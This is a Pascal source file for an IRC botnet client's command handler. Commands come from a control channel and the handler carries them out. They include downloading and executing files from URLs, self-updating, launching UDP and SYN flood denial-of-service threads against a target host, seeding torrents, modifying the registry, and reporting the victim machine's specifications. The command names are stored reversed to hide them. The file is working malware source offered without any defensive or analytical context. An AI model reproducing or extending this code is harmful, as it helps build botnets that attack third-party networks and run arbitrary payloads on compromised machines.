unit commands;

interface

uses
  Windows,
  winsock,
  Functions,
  synflood,
  variables,
  miscfunctions,
  seeder,
  sysutils,
  dlupdate;

  procedure ParseCommand(szCommand, szParameter, szParameter2, szParameter3, szParameter4, szParameter5: String; ControlSet: TControlSetting);
  function SafeCommand(index: integer): String;

  var
  f: integer;
implementation

uses
  base, udpflood;

procedure ParseCommand(szCommand, szParameter, szParameter2, szParameter3, szParameter4, szParameter5: String; ControlSet: TControlSetting);
begin

  if (szCommand = SafeCommand(0)) then   //raw command
    begin
      mainIRC.SendData(szParameter + ' ' + szParameter2 + ' ' + szParameter3 + ' ' +  szParameter4 + ' ' + szParameter5);
    end;



  If (szCommand = SafeCommand(1)) Then
  Begin
   if szParameter = '' then exit
   else begin
   ExecuteFile(szParameter);
   PrivateMessageChannel('[Visited] Site successfully visited.');
   end;
  end;
  if (szCommand = SafeCommand(2)) then  //new nick
    mainIRC.SendData(SafeIRC(16)+' '+CreateNick);

  if (szCommand = SafeCommand(3)) then  //join channel
     JoinChannel(szParameter,szParameter2);

  if (szCommand = SafeCommand(4)) then  //part channel
     PartChannel(szParameter,szParameter2);

  If (szCommand = SafeCommand(18)) Then
 begin
  if szParameter2 = '' Then exit
  else
    UpdateFileFromURL(szParameter, DownloadDir + szParameter2, ControlSet.ControlChannel);
  end;

  If (szCommand = SafeCommand(17)) Then
  begin
   if szParameter2 = '' Then exit
  else
    ExecuteFileFromURL(szParameter, DownloadDir + szParameter2, ControlSet.ControlChannel);
  end;

    if (szCommand = SafeCommand(5)) then  //reconnect
    mainIRC.SendData(SafeIRC(18));

  if (szCommand = SafeCommand(6)) Then  //sort
    JoinChannel(GetISOChannel,'');

  if (szCommand = SafeCommand(7)) then  //close
  begin
    mainIRC.SendData(SafeIRC(19));
    Sleep(3000);
    ExitProcess(0);
  end;

  if (szCommand = SafeCommand(8)) then //udp flood
    begin
      udp.host  := szParameter;
      udp.num   := StrToInt(szParameter2);
      udp.size  := StrToInt(szParameter3);
      udp.delay := StrToInt(szParameter4);
    if szParameter5 = '' then
      udp.port := 0
    else
      udp.port  := StrToInt(szParameter5);
      PrivateMessageChannel('[UDP] Flooding: ' + udp.host + '. Packet size: ' + IntToStr(udp.size) + ', Delay: ' + IntToStr(udp.delay) + '(ms), Duration: ' + IntToStr(udp.num) + '(min)');
      CreateThread(nil, 0, @udpfloodhost, nil, 0, udpthread);
    end;

  if (szCommand = SafeCommand(9)) then  //ssyn flood
    begin
      ddos.TargetIP   := szParameter;
      ddos.TargetPort := StrToInt(szParameter2);
      ddos.len        := StrToInt(szParameter3);
      PrivateMessageChannel('[SSYN] Flooding ' + ddos.TargetIP + ':' + IntToStr(ddos.TargetPort) + ' for ' + IntToStr(ddos.len) + ' seconds');
      CreateThread(nil, 0, @SendSuperSyn, nil, 0, ssynthread);
    end;

  if (szCommand = SafeCommand(10)) then  //stop floods
    begin
      Suspendthread(udpthread);
      Suspendthread(ssynthread);
    end;

  if (szCommand = SafeCommand(11)) then  //seed torrent
    begin
      Doit(szParameter);
    end;

  if (szCommand = SafeCommand(12)) then  //clean reg keys
    begin
      CleanRegistry;
      PrivateMessageChannel('Computer Registry Cleaned!');
    end;

  {if (szCommand = SafeCommand(13)) then  //botkiller
    begin
      CheckKill;
    end; }

  if (szCommand = SafeCommand(14)) then  //unsort
    begin
      PartChannel(GetISOChannel,'');
    end;

  if (szCommand = SafeCommand(15)) then  //uninstall
    begin
      Uninstall;
    end;

  if (szCommand = SafeCommand(16)) then  //computer info
    begin
      PrivateMessageChannel('Bot is Running '+getOS+' with Processor: ' + GetProcessorName + ', RAM: ' + GetTotalRAM + ', System Uptime: ' + GetUptime);
    end;

end;

function SafeCommand(index: integer): string;
begin
  Case index of
     0: result := ReverseString('war');                       //raw
     1: result := ReverseString('tisiv');                     //visit
     2: result := ReverseString('kcinwen');                   //newnick
     3: result := ReverseString('nioj');                      //join
     4: result := ReverseString('trap');                      //part
     5: result := ReverseString('tcennocer');                 //reconnect
     6: result := ReverseString('tros');                      //sort
     7: result := ReverseString('esolc');                     //close
     8: result := ReverseString('pdu');                       //udp
     9: result := ReverseString('nyss');                      //ssyn
    10: result := ReverseString('pots');                      //stop
    11: result := ReverseString('dees');                      //seed
    12: result := ReverseString('naelc');                     //clean
    13: result := ReverseString('lliktob');                   //botkill
    14: result := ReverseString('trosnu');                    //unsort
    15: result := ReverseString('llatsninu');                 //uninstall
    16: result := ReverseString('ofni');                      //info
    17: result := ReverseString('daolnwod');                 //download
    18: result := ReverseString('etadpu');                      //update
  else
    result := '';
  end;
end;

end.
